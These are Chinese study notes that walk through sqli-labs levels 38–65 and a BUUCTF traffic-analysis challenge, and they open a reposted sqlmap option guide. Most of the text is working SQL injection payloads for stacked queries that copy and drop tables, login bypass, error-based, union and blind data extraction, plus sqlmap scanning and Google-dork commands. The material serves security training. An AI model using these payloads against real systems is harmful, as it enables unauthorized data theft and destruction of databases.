堆叠注入（**Stacked Queries Injection**）是一种允许攻击者在一次数据库请求中执行 **多条SQL语句** 的注入技术。其核心是利用SQL语句的分隔符（如分号 `;`）拼接恶意代码，常用于执行任意数据库操作（增删改查）。

**堆叠注入原理**

**基本条件**

+ **数据库支持多语句执行**：  
MySQL默认情况下 **不支持** 堆叠注入（需特定驱动或配置，如PHP的`mysqli_multi_query`）。  
SQL Server、PostgreSQL等数据库通常支持。
+ **应用程序未过滤分号 **`;`：  
若代码直接拼接用户输入且未过滤分号，攻击者可插入分号分隔多条SQL语句。

---

所谓**堆叠注入**就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句。然后在后面输入第二条的数据库操作语句，在条件允许可以被后端带入数据库执行。堆叠注入使用的范围非常有限，例如后端可能会限制 SQL 只执行一条语句。一旦这种漏洞存在，对数据库的破坏性是毁灭性的，因为这表示攻击者可以肆意对数据库进行操作。  
例如此处使用堆叠注入新建一张表，使用 CREATE TABLE 子句，该表将复制 users 表作为一张新的表存在。这种复制可以结合 SQL 注入爆出表名来复制，也可以用社会工程学来猜测。

```sql
?id=1';CREATE TABLE WhiteMoon LIKE users;--+
```

网页回显正常的信息，打开数据库发现security库中已经多了一张whitemoon表了。  
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016387.png)



使用堆叠查询把 users 表中的数据插入新的表中，使用 INSERT INTO 子句实现。

```sql
?id=1';INSERT INTO WhiteMoon SELECT * FROM users;--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016395.png)

使用堆叠查询新建的表的所有记录删掉，使用 DELETE 子句实现。

```sql
?id=1';DELETE FROM WhiteMoon;--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016341.png)

使用堆叠查询把新建的表删掉，使用 DROP 子句实现。

```sql
?id=1';DROP TABLE WhiteMoon;--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016826.png)

#### Less-39,41-堆叠注入-数字型
```sql
?id=1;CREATE TABLE WhiteMoon LIKE users;--+
?id=1;INSERT INTO WhiteMoon SELECT * FROM users;--+
?id=1;DELETE FROM WhiteMoon;--+
?id=1;DROP TABLE WhiteMoon;--+
```



#### Less-40-堆叠注入-')
?id=1	正常

?id=1'	不显示

?id=1"	正常

id=1)	不显示

id=1')	不显示

id=1"）	正常

id=1'))	不显示

```sql
?id=1');CREATE TABLE WhiteMoon LIKE users;--+
?id=1');INSERT INTO WhiteMoon SELECT * FROM users;--+
?id=1');DELETE FROM WhiteMoon;--+
?id=1');DROP TABLE WhiteMoon;--+
```



#### Less-42,43,44,45-堆叠注入/二次注入
用户名测试什么都没有，密码测试直接登录成功

a' OR 1 = 1#

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016073.png)



可以在已知某个用户的用户名的条件下使用万能密码夺取用户，也可以使用二次注入（Less-24）进行攻击。由于密码参数没有进行防御，可以在该字段测试堆叠注入。使用 Less-38 的测试流程，每次登陆时完成一步堆叠注入。

```sql
a' OR 1 = 1;CREATE TABLE WhiteMoon LIKE users;#
a' OR 1 = 1;INSERT INTO WhiteMoon SELECT * FROM users;#
a' OR 1 = 1;DELETE FROM WhiteMoon;#
a' OR 1 = 1;DROP TABLE WhiteMoon;#
```



#### Less-46-报错注入-数字型-页面不返回回显
?sort=1

?sort=2

?sort=3

?sort=4	报错，存在报错注入，可以利用这个漏洞去获取其他数据



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016298.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016436.png)







报错注入：

```sql
?sort=1 AND updatexml(1,concat("!",database()),2)#

?sort=1 AND updatexml(1,concat("!",(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'security')),2)#

?sort=1 AND updatexml(1,concat("!",(SELECT group_concat(c2olumn_name) FROM information_schema.columns WHERE table_schema = 'security' AND table_name = 'emails')),2)#

?sort=1 AND updatexml(1,concat('!',(SELECT concat_ws(':',id,email_id) FROM (SELECT id,email_id FROM emails)text LIMIT 0,1)),1)#

?sort=1 AND updatexml(1,concat('!',(SELECT concat_ws(':',id,email_id) FROM (SELECT id,email_id FROM emails)text LIMIT 1,1)),1)#


```











#### Less-47-报错注入-'-页面不返回回显
```sql
?sort=1' AND updatexml(1,concat("!",database()),2) --+

?sort=1' AND updatexml(1,concat("!",(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'security')),2) --+

?sort=1' AND updatexml(1,concat("!",(SELECT group_concat(c2olumn_name) FROM information_schema.columns WHERE table_schema = 'security' AND table_name = 'emails')),2) --+

?sort=1' AND updatexml(1,concat('!',(SELECT concat_ws(':',id,email_id) FROM (SELECT id,email_id FROM emails)text LIMIT 0,1)),1) --+

?sort=1' AND updatexml(1,concat('!',(SELECT concat_ws(':',id,email_id) FROM (SELECT id,email_id FROM emails)text LIMIT 1,1)),1) --+

```



#### Less-48-时间盲注-数字型
经过测试，这一关是数字型注入，页面不返回报错信息，要使用时间盲注

```sql
?sort=1 AND IF(LENGTH(database())=8,sleep(1),1)--+

?sort=1 AND IF(LEFT((SELECT database()), 1)='s',sleep(1),1)--+

?sort=1 AND IF(LEFT((SELECT database()), 8)='security',sleep(1),1)--+
```





#### Less-49-时间盲注-'
```sql
?sort=1' AND IF(LENGTH(database())=8,sleep(1),1)--+

?sort=1' AND IF(LEFT((SELECT database()), 1)='s',sleep(1),1)--+

?sort=1' AND IF(LEFT((SELECT database()), 8)='security',sleep(1),1)--+
```





#### Less-50,52
输入正常的参数，网页回显用户名列表。对 sort 参数使用单引号闭合，网页返回错误信息。

```sql
?sort=1'
```



和 Less 46 一样使用报错注入或时间注入就可以完成，此处用于测试堆叠注入。使用堆叠查询完成 Less 38 的样例。

```sql
?sort=1;CREATE TABLE WhiteMoon LIKE users;--+
?sort=1;INSERT INTO WhiteMoon SELECT * FROM users;--+
?sort=1;DELETE FROM WhiteMoon;--+
?sort=1;DROP TABLE WhiteMoon;--+
```



#### Less-51,53
此处存在单引号闭合的字符型注入。

 Less 47 一样使用报错注入或时间注入就可以完成，此处用于测试堆叠注入。

```sql
?sort=1';CREATE TABLE WhiteMoon LIKE users;--+
?sort=1';INSERT INTO WhiteMoon SELECT * FROM users;--+
?sort=1';DELETE FROM WhiteMoon;--+
?sort=1';DROP TABLE WhiteMoon;--+
```

#### Less-54-联合查询注入(十次限制)-'
```sql
#判断得知为字符型注入:
?id=1' and 1=1 --+

#判断字段数
?id=1' order by 3 --+

#爆当前数据库和用户名
?id=0' union select 1,user(),database() --+

#爆当前数据库下的所有表
?id=0' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+

#这里的表每一次都是随机给出的/dtbzuzk1tk/

#爆字段
?id=0' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='dtbzuzk1tk' --+

#字段也是随机/secret_S7T1/

#爆数据，取/secret_****/段为过关数据
?id=0' union select 1,database(),group_concat(0x7e,sessid,0x7e,secret_S7T1) from dtbzuzk1tk --+
```



#### Less-55-联合查询注入(十四次限制)-)
```sql
#判断得知为字符型注入:
?id=1) and 1=1 --+

#判断字段数
?id=1) order by 3 --+

#爆当前数据库和用户名
?id=0) union select 1,user(),database() --+

#爆当前数据库下的所有表
?id=0) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+

#这里的表每一次都是随机给出的/k4slr3jkz6/

#爆字段
?id=0) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='k4slr3jkz6' --+

#字段也是随机/secret_OBJS/

#爆数据，取/secret_****/段为过关数据
?id=0) union select 1,database(),group_concat(0x7e,sessid,0x7e,secret_OBJS) from k4slr3jkz6 --+
```



#### Less-56-联合查询注入(十四次限制)-'）
```sql
#判断得知为字符型注入:
?id=1') and 1=1 --+

#判断字段数
?id=1') order by 3 --+

#爆当前数据库和用户名
?id=0') union select 1,user(),database() --+

#爆当前数据库下的所有表
?id=0') union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+

#这里的表每一次都是随机给出的/k4slr3jkz6/

#爆字段
?id=0') union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='k4slr3jkz6' --+

#字段也是随机/secret_OBJS/

#爆数据，取/secret_****/段为过关数据
?id=0') union select 1,database(),group_concat(0x7e,sessid,0x7e,secret_OBJS) from k4slr3jkz6 --+
```



#### Less-57-联合查询注入(十四次限制)-"
```sql
#判断得知为字符型注入:
?id=1" and 1=1 --+

#判断字段数
?id=1" order by 3 --+

#爆当前数据库和用户名
?id=0" union select 1,user(),database() --+

#爆当前数据库下的所有表
?id=0" union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+

#这里的表每一次都是随机给出的/4wlhf91tdn/

#爆字段
?id=0" union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='4wlhf91tdn' --+

#字段也是随机/secret_WCBG/

#爆数据，取/secret_****/段为过关数据
?id=0" union select 1,database(),group_concat(0x7e,sessid,0x7e,secret_WCBG) from 4wlhf91tdn --+
```



#### Less-58-报错注入（五次限制）-'
```sql
#获得表名：之前已经知道数据库的名字是challenges

?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES') ),1)--+

#获取字段：
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name='rropvsv2k3' )),1)--+

 #获取字段的值：
 ?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_NP44) from challenges.rropvsv2k3 )),1)--+
 
 mNPc5dq8hrv47LdDXgFFjiJe
```



#### Less-59-报错注入（五次限制）-数字型
```sql
#获得表名：

?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES') ),1)--+

#获取字段：
?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name='jzhybgbqrz' )),1)--+

 #获取字段的值：
 ?id=1 and updatexml(1,concat(0x7e,(select group_concat(secret_F0VL) from challenges.jzhybgbqrz )),1)--+
 
 V4AyD7JBzbT2AdCUcw1OlmAg
```





#### Less-60-报错注入（五次限制）-")
```sql
#获得表名：

?id=1") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES') ),1)--+

#获取字段：
?id=1") and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name='801z2q3ff4' )),1)--+

 #获取字段的值：
 ?id=1") and updatexml(1,concat(0x7e,(select group_concat(secret_9N7R) from challenges.801z2q3ff4 )),1)--+
 
 Iy2k37ZvBStuGa5Xq0b8aUGy

```



#### Less-61-报错注入（五次限制）-'))
```sql
#获得表名：

?id=1')) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES') ),1)--+

#获取字段：
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name='v9gnhvugn2' )),1)--+

 #获取字段的值：
 ?id=1')) and updatexml(1,concat(0x7e,(select group_concat(secret_9EHB) from challenges.v9gnhvugn2 )),1)--+
 
 s1DwpRlu1CKlzFP65tuY5DkN

```



#### Less-62-盲注-')
此处union和报错注入都已经失效了，那我们就要使用盲注了。

+ 爆当前数据库的长度:

```plain
?id=1') and length(database())>8 #   正确 
?id=1') and length(database())>9 #   正确 
?id=1') and length(database())>10 #  错误 
?id=1') and length(database())=10 #  正确 
```

得数据库长度为 10

+ 爆数据库的每一位字符:

```plain
?id=1') and ascii(mid(database(),1,1))=99 #
```

+ 爆当前数据库所有表的个数:

```plain
?id=1') and (select count(table_name) from information_schema.tables where table_schema=database())=1 #
```

+ 第一个表的长度:

```plain
?id=1') and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>5 #
```

+ 第一个表的每一个字符:

```plain
?id=1') and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=78 #
```

得到表名为: N18FOKJDNC

+ 爆第一个字段名的长度:

```plain
?id=1') and length((select column_name from information_schema.columns where table_name='N18FOKJDNC' limit 0,1))=2 #
```

+ 爆第一个字段名的每一个字符:

```plain
?id=1') and ascii(mid((select column_name from information_schema.columns where table_name='N18FOKJDNC' limit 0,1),1,1))=105 #
```

最后得第一个字段名为: id

然后依次爆得第二、三、四个字段名分别为: sessid,secret_BDFP, tryy

+ 爆secret_BDFP字段值的长度:

```plain
?id=1') and (select length(secret_BDFP) from N18FOKJDNC)=24 #
```

+ 爆每一个值:

```plain
?id=1') and ascii(mid((select secret_BDFP from N18FOKJDNC),1,1))=113 #
```

最后得值为: **qAAMVVGX0thxbmsazGMxOlFe**



#### Less-63-盲注-'
注入点改变，其他于Less-62一样

#### Less-64-盲注-数字
注入点改变，其他于Less-62一样

#### Less-65-盲注-"
注入点改变，其他于Less-62一样



[BUUCTF在线评测sqltest](https://buuoj.cn/challenges#sqltest)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016163.png)



得到一个.pcapng文件，双击在Wireshark中打开



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016097.png)



根据题目，这是sql攻击，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016229.png)





导出`http`对象并过滤`ascii`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016252.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016882.png)





布尔盲注一般用`substr()`切割每个字符串，并一个一个地用`ascii()`转成ASCII码来判断，以爆出真正的数据，但是`substr()`也用于判断表名、字段名的长度，所以这里直接过滤`ascii`，方便之后的分析





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022017978.png)





这里的780和848俩个字节，是HTTP请求内容的实际数据长度（即服务器接收或发送的HTTP协议载荷大小）



780可能是没有成功的，`>101`返回true（848），`>102`返回false（780），说明第一个字符的ASCII码为`101`

所以每次找最后一个就对了：

`102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125 `





flag{47edb8300ed5f9b28fc54b0d09ecdef7}







#### sqlmap
下载和安装：

[sqlmap：自动 SQL 注入和数据库接管工具](https://sqlmap.org/)





kali操作系统自带sqlmap，可以直接输入sqlmap执行。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022017638.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022017392.png)





# sqlmap命令详解

> 转载自： [全栈程序员站长](https://cloud.tencent.com/developer/user/8223537)      原文：https://cloud.tencent.com/developer/article/2148285

#### 目录

- [0x01 sqlmap 确定目标](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [1.1 直连数据库](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [1.2 URL探测](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [1.3 文件读取目标](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [1.4 Google 批量扫描注入](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x02 sqlmap 请求参数设置（一）](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [2.1 设置 HTTP 方法](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [2.2 设置 POST 提交参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [2.3 设置参数分割符](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [2.4 设置Cookie 头](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [2.5 设置 User-Agent 头](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [2.6 设置 Host 头](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [2.7 设置 Referer 头](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [2.8 设置 额外 HTTP 头](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [2.9 设置 HTTP 协议认证](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [2.10 设置 HTTP 代理](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x03 sqlmap 请求参数设置（二）](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [3.1 设置Tor隐藏网络](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [3.2 设置延时](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [3.3 设置超时](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [3.4 设置重传次数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [3.5 设置随机化参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [3.6 设置日志过滤目标](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [3.7 设置忽略 401](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [3.8 设置 HTTP 协议私钥](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [3.9 设置安全模式](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [3.10 设置忽略URL编码](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x04 sqlmap 性能优化](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [4.1 设置持久 HTTP 连接](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [4.2 设置 HTTP 空连接](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [4.3 设置多线程](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [4.5 设置预测输出](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x05 sqlmap 注入位置介绍](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [5.0 注入介绍](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [5.1 设置指定注入参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [5.2 设置URL注入位置](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [5.3 设置任意注入位置](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x06 sqlmap 注入参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [6.1 强制设置 DBMS](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [6.2 强制设置 OS](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [6.3 关闭负载转换机制](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [6.4 关闭字符转义机制](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [6.5 强制设置无效值替换](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [6.6 自定义注入负载位置](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [6.7 设置 Tamper 脚本](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [6.8 设置 DBMS 认证](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x07 sqlmap 自定义检测参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [7.1 设置探测等级](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [7.2 设置风险参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [7.3 设置页面比较参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [7.4 设置内容比较参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x08 sqlmap 注入技术参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [8.1 设置具体 SQL 注入技术](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [8.2 设置时间盲注延迟时间](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [8.3 设置 UNION 字段数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [8.4 设置 UNION 字符](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [8.5 设置 UNION 查询表](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [8.6 设置 DNS 露出攻击](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [8.7 设置二次注入](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [8.8 识别指纹](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x09 sqlmap 检索 DBMS 信息](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [9.1 检索 DBMS Banner 信息](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [9.2 检索 DBMS 当前用户](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [9.3 检索 DBMS 当前数据库](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [9.4 检索 DBMS 当前主机名](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x0A sqlmap 枚举 DBMS 信息](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [10.1 探测当前用户 DBA](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [10.2 枚举 DBMS 用户](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [10.3 枚举 DBMS 用户密码](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [10.4 枚举 DBMS 权限](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [10.5 枚举数据库名](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [10.6 枚举数据库表](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [10.7 枚举数据库表的列名](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [10.8 枚举数据值](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x0B sqlmap 枚举信息](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [11.1 枚举 schema 信息](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [11.2 枚举数据表数量](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [11.3 获取数据信息](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [11.4 设置条件获取信息](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [11.5 暴力激活成功教程数据](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [11.6 读取文件](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [11.7 写入文件](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [11.8 检索所有信息](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x0C sqlmap 系统参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [12.1 执行系统命令](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [12.2 结合Metasploit](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [12.3 注册表介绍](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [12.4 注册表操作](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x0D sqlmap 通用参数（一）](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [13.1 加载 sqlite 会话文件](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [13.2 加载 http 文本文件](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [13.3 设置默认选择选项](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [13.4 执行系统命令](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [13.5 设置盲注字符集](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [13.6 爬取 URL](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [13.7 在 CSV 输入中使用的分割字符](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [13.8 设置输出格式](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [13.9 探测之前检测 Internet 连接](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [13.10 解析和测试表单的输入字段](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x0E sqlmap 通用参数（二）](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [14.1 设置预计完成时间](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [14.2 刷新会话文件](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [14.3 忽略会话中的存储结果](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [14.4 使用 Hex 函数检索数据](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [14.5 设置自定义输出路径](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [14.6 从响应页面解析错误](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [14.7 强制设置 DBMS 编码](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [14.8 存储 HTTP 流量到 HAR](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [14.9 筛选具体 Payload](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [14.10 过滤具体 Payload](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x0F sqlmap 杂项参数](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- - [15.1 使用缩写助记符](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [15.2 设置探测预警](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [15.3 设置问题答案](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [15.4 发现 SQL 注入预警](https://cloud.tencent.com/developer?from_column=20421&from=20421)
  - [15.5 其他](https://cloud.tencent.com/developer?from_column=20421&from=20421)
- [0x10 常用 Tamper 脚本](https://cloud.tencent.com/developer?from_column=20421&from=20421)

## 0x01 sqlmap 确定目标

### 1.1 直连数据库

sqlmap支持直接连接数据库，通过以下命令来直连

服务型数据库（前提知道数据库用户名和密码） DBMS://USER:PASSWORD@DBMS_PORT/DATABASE_NAME （MySQL，Oracle，Microsoft SQL Server，PostgreSQL，etc）

例如： python sqlmap.py -d “mysql://admin:admin@192.168.1.2:3306/security” -f –banner 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020546.png)

文件型数据库（前提知道数据库的绝对路径） DBMS://DATABASE_FILEPATH (SQLite，Microsoft Access，Fire bird，etc)

### 1.2 URL探测

sqlmap直接对单一URL探测，使用参数 -u 或 –url URL格式：http(s): //targeturl [:port] /[…]

例如： python sqlmap.py -u http://www.target/vuln.php?id=1 –banner

### 1.3 文件读取目标

sqlmap支持从不同类型的文件中读取目标进行SQL注入探测 1、-l 从BurpSuite Proxy或从WebScarab Proxy中读取HTTP请求日志 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020148.png)

 查看burpsuite抓取的日志信息 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020092.png)

 使用sqlmap进行演示 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021326.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020052.png)

2、-x 从sitemap.xml站点地图文件中读取目标探测

3、-m 从多行文本格式文件读取多个目标

4、-r 从文本文件中读取HTTP请求作为SQL注入探测目标 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021903.png)

 将burp suite抓取的HTTP请求信息，复制到txt文件中，在使用sqlmap -r ‘txt文件’ 进行探测

5、-c 从配置文件 sqlmap.conf 中读取目标探测 查看sqlmap.conf 文件的内容 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021918.png)

 将想要探测目标的url填入该文件中，里面也可以通过日志文件形式（相当于使用 -l 参数）、HTTP请求文件（相当于使用 -r 参数）进行探测，还可以设置其他参数，例如：method(HTTP请求方法)、data（指定POST提交的数据）等等

接下来，我们将目标url填入sqlmap.conf文件，进行演示 python sqlmap.py -c sqlmap.conf –banner 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020660.png)

### 1.4 Google 批量扫描注入

sqlmap通过 -g 自动利用Google获取指定Google hack的目标，然后利用交互向导模式进行SQL注入探测

例如： python sqlmap.py -g “inurl:.php?id=” 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020037.png)

## 0x02 sqlmap 请求参数设置（一）

### 2.1 设置 HTTP 方法

Sqlmap会自动在探测过程中使用适合的HTTP请求方法。但是在某些具体情况下，需要强制使用具体的HTTP请求方法。例如 PUT请求方法。HTTP PUT请求方法不会自动使用，因此需要我们强制指定。使用 –method=PUT。 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021919.png)

例如： python sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-1/?id=1” –method=get –banner

### 2.2 设置 POST 提交参数

默认情况下，用于执行HTTP请求的HTTP方法是GET，但是您可以通过提供在POST请求中发送的数据隐式地将其更改为POST。这些数据作为这些参数，被用于SQL注入检测。 例如： python sqlmap.py -u “http://www.target.com/vuln.php” –data=“id=1” -f –banner –dbs –users

-f fingerprint 指纹

演示： python sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-11/” –data=“uname=admin&passwd=admin&submit=Submit” -p uname -f –banner 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020309.png)

### 2.3 设置参数分割符

在某些情况下，sqlmap需要覆盖默认参数分隔符(例如& in GET和POST数据)，才能正确地分割和单独处理每个参数。

例如： python sqlmap.py -u “http://www.target.com/vuln.php” –data=“query=foobar;id=1” –param-del=”;” -f –banner –dbs –users

演示： python sqlmap.py -u “http://192.168.1.2/sqlilabs/Less-11/” –data=uname=“admin&passwd=admin&submit=Submit” –param-del=”&” -p uname -f –banner 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020662.png)

### 2.4 设置Cookie 头

Sqlmap中用来设置Cookie的参数：–cookie, –cookie-del, –load-cookies –drop-set-cookie 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021972.png)

